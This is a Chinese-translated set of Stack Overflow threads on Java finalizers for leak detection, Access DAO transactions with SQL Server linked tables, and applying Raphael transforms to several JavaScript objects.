假设我创建了一些资源类，其中包含用于清理资源的 close() 方法，如果有人忘记调用 close()，我想重写 finalize() 以释放资源（并打印警告）。如何正确地做到这一点？

*   是否仅推荐用于本机（JNI 分配的）资源？
*   如果你从终结器中使用对另一个已经终结的对象的引用会发生什么？如果存在循环依赖关系，我看不出垃圾收集器如何阻止您访问可能已执行终结器的对象。
*   是否有更好的替代方法来覆盖 finalize() 来检测和/或处理资源泄漏？
*   在实现终结器时还有其他需要注意的陷阱吗？

注意：我知道使用 finalize() 通常是个坏主意，并且不能保证会被调用，还有其他几个问题在讨论这个问题。这个问题专门关于*如何*在 Java 中实现终结器，而不是关于*为什么*应该（或不应该）。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-17T15:23:54.673

在[有效的 java (2nd edition)](https://rads.stackoverflow.com/amzn/click/com/0321356683)中，Joshua 在 Item #7 中详细介绍了如何做到这一点。他首先建议你几乎不应该使用`finalizer`s。但是，使用它的一个原因是仅打印一条日志语句，说明您有资源泄漏。他说这样做的一个缺点是有人可以扩展你的类而不正确地调用超级终结器。所以他建议在子类中做这样的事情：

```
// Manual finalizer chaining
   @Override protected void finalize() throws Throwable {
       try {
           ... // Finalize subclass state
       } finally {
           super.finalize();
   } 
} 
```

这是为了确保如果当前类中出现问题，`finally`仍然会调用它。这可能是一个糟糕的解决方案，因为它取决于将您的类子类化的人。另一种解决方案是使用监护人目标文件来完成这项工作。这看起来像：

```
// Finalizer Guardian idiom
   public class Foo {
// Sole purpose of this object is to finalize outer Foo object
      private final Object finalizerGuardian = new Object() {
         @Override protected void finalize() throws Throwable {
            ... // Finalize outer Foo object
         }
      };
      ...  // Remainder omitted
} 
```

这是一种更简洁的方法，因为您知道没有人可以覆盖该功能。

关闭资源的建议方法仍在实施`Closeable`，并确保由用户自行关闭。正如 Josuha 建议的那样，您不应该在该`finalize`方法中执行任何时间敏感操作。JVM 可能会选择在将来的某个时间运行它。如果您依赖这种方法来进行提交或一些重要的事情，那么这是一个坏主意。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T15:51:18.927

> 是否仅推荐用于本机（JNI 分配的）资源？

不，您的用例对于终结器也是有效的。我的意思是记录资源泄漏。

> 如果在终结器中访问另一个已终结的 Java 对象会发生什么？

~~如果您仍然可以访问它，它还没有最终确定。或者，也许我在你的问题中遗漏了一些东西。~~

我现在知道了。可能是 A 和 B 都有资格进行垃圾收集，并且它们之间存在引用。这应该没问题，因为默认情况下`finalize()`什么都不做。如果您为两个对象编写自定义`finalize()`方法，则应该独立于它们最终确定的顺序编写代码。您还应该注意引用变为`null`，因为相应的对象可能已经被垃圾收集了。

> 是否有更好的替代方法来覆盖 finalize() 来检测和/或处理资源泄漏？

我认为使用终结器时最重要的事情是检测和记录/警告未处理的泄漏。记录此泄漏的最佳时机是在资源对象被垃圾回收之前。所以终结器很适合这个。

我想强调一点：我不会使用终结器来处理忘记关闭资源的程序员，而是通知他需要修复他的代码。

> 在实现终结器时还有其他需要注意的陷阱吗？

具有终结器的对象似乎也存在性能损失。你应该做一个测试，看看它对你有什么好处。如果存在重要的性能损失，我会尝试想象一种机制，仅在开发时使用终结器来记录资源泄漏。

按照 Amir Raminfar 的建议，在使用终结器继承对象时要小心。

还有一件事：看一下 [ 的源代码，`FileInputStream][1]`或者`[FileOutputStream][2]`他们出于同样的原因使用终结器。

# sql-server - 使用 DAO 和 Sql Server 链接表的事务

> ID：12461997
> 
> 赞同：6
> 
> 时间：2012-09-17T14:59:31.137
> 
> 标签：sql-server, ms-access, transactions, dao, linked-tables

我正在将一个经典的 Access 应用程序迁移到 Sql Server，即 DAO+Linked 表。

我发现了一个令人沮丧的行为：当我在链接表上使用记录集进行更改时，Access 使用多个连接。多个连接意味着服务器端一次有多个事务。这些交易是独立的。没有嵌套。

使用链接表到 .mdb 文件的标准 MS-Access 行为是不同的。一次只有一笔交易。在执行提交之前，在同一 DAO.Workspace 中运行的任何代码都可以看到每个 db 更改。

规则已更改，使用客户端事务的现有 DAO 代码将失败。

如果我使用打开为 dbOpenDynaset 的记录集添加或更新记录，任何尝试读取它们的代码都将失败：找不到新记录并查看原始状态的现有记录。为什么？因为操作是在多个独立的事务中进行的

执行示例提供的代码，sql profiler 将显示不同的操作是使用不同的事务 ID 进行的。

我已经使用 ADO 对此进行了测试，并且一切正常。但是有数千行代码。

除了使用 ADO 重写代码之外，还有其他解决方案吗？

我可以修改标准访问行为吗？（使用读取未提交的隔离级别，指示不打开新连接，...）

下面的代码重现了这个问题。这很简单：

1.- 在现有记录上打开记录集
2.- 添加新记录
3.- 尝试读取最近添加的记录

如果我在 (1) 中使用 dbOpenDynaset，我将不会在 (3) 中看到新记录。

我正在使用 Acc-2010、.accdb 格式文件和 Sql Server 2008 R2

谢谢。

```
 Private Sub test0()
     Dim bResult As Boolean

    Dim bUseTrans As Boolean 'New record added in transaction

    Dim rsExist As DAO.Recordset2 'Dummy recordset
     Dim tRecordsetExist As DAO.RecordsetTypeEnum 'Dummy recordset type:
                                                  '  with dbOpenDynaset fail.
                                                  '  Any other works fine

    Dim rs2Add As DAO.Recordset

    Dim rs2Read As DAO.Recordset 'Used to read recently added record
     Dim tRecordset2Read As DAO.RecordsetTypeEnum 'Recordset type used to read new record. Doesn't affect

    Dim bTranInitiated As Boolean 'Track if we are in transaction

    Dim lngExistingNumber As Long
     Dim lngNewNumber As Long
     Dim lngNewID As Long
     Dim strSQL As String
 On Error GoTo HandleErr

    'Invoices table definition in SS. Table is linked as [dbo_Invoices]:
     '   CREATE TABLE [dbo].[Invoices](
     '       [IdInvoice] [int] IDENTITY(1,1) NOT NULL,
     '       [InvoiceNumber] [int] NOT NULL,
     '       [InvoiceDescription] [varchar](50) NOT NULL,
     '    CONSTRAINT [PK_Invoices] PRIMARY KEY CLUSTERED
     '   (
     '       [IdInvoice] Asc
     '   )WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
     '   ) ON [PRIMARY]

    Set wks = DBEngine.Workspaces(0)
     Set dbs = wks.Databases(0)

    bUseTrans = True 'Without transaction everything works well

    tRecordsetExist = dbOpenDynaset 'Dummy recordset type:
                                     '  dbOpenDynaset makes fail.
                                     '  Any other works fine

    tRecordset2Read = dbOpenForwardOnly 'Does not affect

    lngExistingNumber = 12001
     lngNewNumber = -lngExistingNumber

    'Clean previous runs of the test and make sure that referenced invoice exists.
     dbs.Execute "Delete from dbo_Invoices Where InvoiceNumber = " & lngNewNumber, dbFailOnError Or dbSeeChanges
     On Error Resume Next
     strSQL = "Insert Into dbo_Invoices (InvoiceNumber, InvoiceDescription) " & _
             " Values (" & lngExistingNumber & ", 'Original invoice' )"
     dbs.Execute strSQL, dbFailOnError Or dbSeeChanges
     On Error GoTo HandleErr

    If bUseTrans Then
         wks.BeginTrans
         bTranInitiated = True
     End If

    strSQL = "Select IdInvoice, InvoiceNumber from dbo_Invoices " & _
             " Where InvoiceNumber = " & lngExistingNumber
     If tRecordsetExist = dbOpenDynaset Then
         Set rsExist = dbs.OpenRecordset(strSQL, dbOpenDynaset, dbSeeChanges)
     Else
         Set rsExist = dbs.OpenRecordset(strSQL, tRecordsetExist)
     End If
     If rsExist.BOF And rsExist.EOF Then
         Err.Raise vbObjectError, , "Original invoice " & lngExistingNumber & " not found"
     End If

    Set rs2Add = dbs.OpenRecordset("Select * from dbo_Invoices", dbOpenDynaset, dbAppendOnly Or dbSeeChanges)

    rs2Add.AddNew
     rs2Add!InvoiceNumber = lngNewNumber
     rs2Add!InvoiceDescription = "Invoice anulation, ref " & lngExistingNumber
     rs2Add.Update

    'After executing .Update rs2Add goes to .EOF. This action reposition the recordset on the new record
     rs2Add.Move 0, rs2Add.LastModified

    lngNewID = rs2Add!IdInvoice
     Debug.Print "New record added: IdInvoice = " & rs2Add!IdInvoice & ", InvoiceNumber = " & rs2Add!InvoiceNumber

    'Try to read the new record
     strSQL = "Select * from dbo_Invoices Where IdInvoice = " & lngNewID
     If tRecordset2Read = dbOpenDynaset Then
         Set rs2Read = dbs.OpenRecordset(strSQL, dbOpenDynaset, dbSeeChanges)
     Else
         Set rs2Read = dbs.OpenRecordset(strSQL, tRecordset2Read)
     End If
     If (rs2Read.BOF And rs2Read.EOF) Then
         Err.Raise vbObjectError, , "rs2Read: Not found using IdInvoice = " & lngNewID
     End If
     Debug.Print "New record found with IdInvoice = " & rs2Read!IdInvoice
     rs2Read.Close

    bResult = True
 ExitHere:
     If Not wks Is Nothing Then
         If bTranInitiated Then
             If bResult Then
                 wks.CommitTrans
             Else
                 wks.Rollback
             End If
             bTranInitiated = False
         End If
     End If
     On Error Resume Next
     If Not rs2Add Is Nothing Then
         rs2Add.Close
         Set rs2Add = Nothing
     End If
     If Not rs2Read Is Nothing Then
         rs2Read.Close
         Set rs2Read = Nothing
     End If
     Exit Sub
 HandleErr:
     Dim e As Object
     If Err.Description Like "ODBC*" Then
         For Each e In DBEngine.Errors
             MsgBox e.Description, vbCritical
         Next
     Else
         MsgBox Err.Description, vbCritical
     End If
     bResult = False
     Resume ExitHere
     Resume
 End Sub 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T14:34:54.883

不幸的是，微软声明以下关于`Workspace.IsolateODBCTrans`属性： http: [//msdn.microsoft.com/en-us/library/office/bb208483 (v=office.12).aspx](http://msdn.microsoft.com/en-us/library/office/bb208483(v=office.12).aspx)

某些 ODBC 服务器（例如 Microsoft SQL Server）**不允许在单个连接上同时进行事务处理**。如果您需要一次针对此类数据库挂起多个事务，请在打开每个 Workspace 后立即将 IsolateODBCTrans 属性设置为 True。**这会强制每个 Workspace 使用单独的 ODBC 连接。**

不确定这是否会帮助您决定要做什么。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T23:57:16.730

对于保留在 mdb 中的那些表，您可以继续使用 dao。但是对于像这样的 sqlserver 表（链接表）： Global objConn As New ADODB.Connection

并在例程中：

```
 Dim rst As ADODB.Recordset
    DoCmd.SetWarnings False
    If objConn.State <> adStateOpen Then
        MsgBox ("Connection to SQL server has not been made. Please exit and resolve problem.")
        Exit Sub
    End If

    Set rst = New ADODB.Recordset

Dim stdocname As String
rst.Open "tblbilling", objConn, adOpenDynamic, adLockPessimistic 
```

等等等等等等……

# javascript - 将函数应用于多个对象

> ID：12461999
> 
> 赞同：0
> 
> 时间：2012-09-17T14:59:32.303
> 
> 标签：javascript

我有以下代码：

```
this.resize2.intrface.transform(Raphael.format("t{0},{1},S{2},{3},{4},{5}{6}",
                                    this.resize2.intrface.ox,
                                    this.resize2.intrface.oy,                                                
                                    xmove,    
                                    ymove,
                                    this.resize2.bbx,
                                    this.resize2.bby,
                                    this.resize2.intrface.scale));
this.resize2.core.transform(Raphael.format("t{0},{1},S{2},{3},{4},{5}{6}",
                                    this.resize2.intrface.ox,
                                    this.resize2.intrface.oy,                                                
                                    xmove,    
                                    ymove,
                                    this.resize2.bbx,
                                    this.resize2.bby,
                                    this.resize2.intrface.scale)); 
```

我想将变换函数应用于一行中的两个对象。这可能吗？为了说明我打算做什么，请参见下面的以下（不工作）示例：

```
$(this.resize2.intrface, this.resize2.core).transform(Raphael.format("t{0},{1},S{2},{3},{4},{5}{6}",
                                    this.resize2.intrface.ox,
                                    this.resize2.intrface.oy,                                                
                                    xmove,    
                                    ymove,
                                    this.resize2.bbx,
                                    this.resize2.bby,
                                    this.resize2.intrface.scale)); 
```

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T15:56:52.467

这是关于一些重复的代码重构。

```
function transform(factoryMethod) {
    factoryMethod(Raphael.format("t{0},{1},S{2},{3},{4},{5}{6}",
                    this.resize2.intrface.ox,
                    this.resize2.intrface.oy,
                    xmove,    
                    ymove,
                    this.resize2.bbx,
                    this.resize2.bby,
                    this.resize2.intrface.scale));
} 
```

使用它来调用：

```
transform.apply(this, [this.resize2.intrface.transform]);
transform.apply(this, [this.resize2.core.transform]); 
```